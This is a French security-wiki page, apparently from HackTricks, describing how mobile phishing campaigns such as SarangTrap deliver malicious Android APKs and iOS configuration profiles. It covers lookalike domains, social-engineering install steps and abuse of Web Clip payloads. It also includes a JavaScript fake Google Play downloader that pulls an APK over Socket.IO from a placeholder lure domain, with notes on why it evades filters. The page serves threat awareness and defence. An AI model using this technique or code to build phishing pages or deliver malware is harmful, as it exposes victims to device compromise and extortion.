# Phishing mobile et distribution d’applications malveillantes (Android et iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page présente les techniques utilisées par les acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobile iOS** par phishing (SEO, ingénierie sociale, faux stores, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap, révélée par Zimperium zLabs (2025), et d’autres recherches publiques.<sup>[[1]](#references)</sup>

## Déroulement de l’attaque

1. **Infrastructure de SEO et de phishing**
   * Enregistrer des dizaines de domaines ressemblants (rencontres, partage cloud, service automobile…).  
     – Utiliser des mots-clés dans la langue locale et des emojis dans l’élément `<title>` pour obtenir un meilleur classement dans Google.  
     – Héberger les instructions d’installation Android (`.apk`) et iOS sur la même page de destination.
2. **Téléchargement de la première étape**
   * Android : lien direct vers un APK *non signé* ou provenant d’un « store tiers ».  
   * iOS : lien `itms-services://` ou HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Comportement après installation sur Android**
   * L’exécution contrôlée par C2, l’abus des permissions, les contournements de dropper, la collecte en arrière-plan et d’autres comportements malveillants après installation sont présentés dans la page dédiée ci-dessous sur la post-exploitation des malwares Android.
4. **Technique de distribution iOS**
   * Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., afin d’inscrire l’appareil à une supervision de type « MDM ».  
   * Instructions d’ingénierie sociale :
     1. Ouvrir Réglages ➜ *Profil téléchargé*.
     2. Toucher *Installer* trois fois (captures d’écran sur la page de phishing).  
     3. Faire confiance au profil non signé ➜ l’attaquant obtient les autorisations *Contacts* et *Photos* sans examen par l’App Store.
5. **Charge utile Web Clip iOS (icône d’application de phishing)**
   * Les charges utiles `com.apple.webClip.managed` peuvent **épingler une URL de phishing à l’écran d’accueil** avec une icône et un libellé personnalisés.
   * Les Web Clips peuvent s’exécuter **en plein écran** (masquant l’interface du navigateur) et être définis comme **non supprimables**, obligeant ainsi la victime à supprimer le profil pour retirer l’icône.<sup>[[3]](#references)</sup>
6. **Couche réseau**
   * HTTP simple, souvent sur le port 80, avec un en-tête HOST tel que `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Post-exploitation des malwares Android

Pour les techniques de malware Android après installation, telles que C2, l’abus d’Accessibility, les overlays, l’automatisation ATS, le chargement de DEX par étapes, les SMS surtaxés et la persistance, voir :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Dissimulation d’APK via Socket.IO/WebSocket et fausses pages Google Play

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré à des leurres imitant Google Play. Cela dissimule l’URL de la charge utile, contourne les filtres d’URL et d’extension, et conserve une expérience d’installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>

Flux client typique observé sur le terrain :

<details>
<summary>Téléchargeur Play factice Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Pourquoi il échappe aux contrôles simples :
- Aucune URL statique d’APK n’est exposée ; le payload est reconstruit en mémoire à partir des trames WebSocket.
- Les filtres d’URL, de type MIME et d’extension qui bloquent les réponses directes en .apk peuvent ne pas détecter les données binaires acheminées via WebSockets/Socket.IO.
- Les crawlers et les sandbox d’URL qui n’exécutent pas les WebSockets ne récupèrent pas le payload.

Voir aussi les techniques et outils liés à WebSocket :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [La face sombre de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Paramètres du payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Cheval de Troie bancaire ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
